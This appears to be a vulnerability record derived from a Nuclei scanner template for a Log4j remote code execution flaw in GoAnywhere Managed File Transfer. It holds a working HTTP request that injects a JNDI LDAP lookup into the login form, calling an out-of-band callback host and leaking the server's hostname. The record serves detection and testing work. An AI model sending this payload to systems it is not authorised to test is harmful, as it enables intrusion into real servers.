# Vulnerability: GoAnywhere Managed File Transfer - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`goanywhere-mft-log4j-rce.yaml`)

## Description
GoAnywhere Managed File Transfer is vulnerable to a remote command execution (RCE) issue via the included Apache Log4j.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /goanywhere/auth/Login.xhtml HTTP/1.1
Host: {{Hostname}}

POST /goanywhere/auth/Login.xhtml HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{RootURL}}
Referer: {{RootURL}}/goanywhere/auth/Login.xhtml

formPanel%3AloginGrid%3Aname=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.name.{{interactsh-url}}}&formPanel%3AloginGrid%3Avalue_hinput=pass&formPanel%3AloginGrid%3Avalue={{view}}}&formPanel%3AloginGrid%3AloginButton=&loginForm_SUBMIT=1&javax.faces.ViewState={{view}}
```

